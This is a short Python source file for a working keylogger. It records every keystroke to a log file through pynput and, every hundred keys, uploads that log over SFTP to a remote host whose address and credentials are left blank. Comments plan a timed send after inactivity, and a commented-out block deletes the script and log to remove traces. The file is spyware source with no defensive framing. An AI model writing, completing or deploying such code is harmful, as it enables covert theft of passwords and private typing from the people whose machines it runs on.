from pynput.keyboard import Key, Listener
import logging, pysftp

# must be on the harddrive not in an obscure folder to work
# set config for the logging module
logging.basicConfig(filename=("" + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def send_file():
    remote_host = ''
    remote_host_username = ''
    remote_host_password = ''
    with pysftp.Connection(host=remote_host, username = remote_host_username, password = remote_host_password) as sftp:
        sftp.put('keylogs.txt')

def get_mac():
    return

# action when a key is pressed
def on_press(key):
    logging.info(str(key))
    # every 100 keys, send log file
    # what if type 30 keys? time delay?
    # after 5 min of no activity, send it and reset counter to 0
    # if counter == 0 when 5 minutes hits, dont push, reset timer
    global counter
    if counter == 100:
        send_file()
        counter = 0
    else:
        counter += 1

# code that actually runs here
global counter
counter = 0
with Listener(on_press=on_press) as listener:
    listener.join()


# # delete files after X amount of days
# init_time = time.localtime()
# # dynamic updates below
# # current_time = 
# os.remove('logger.py')
# os.remove('keylogs.txt')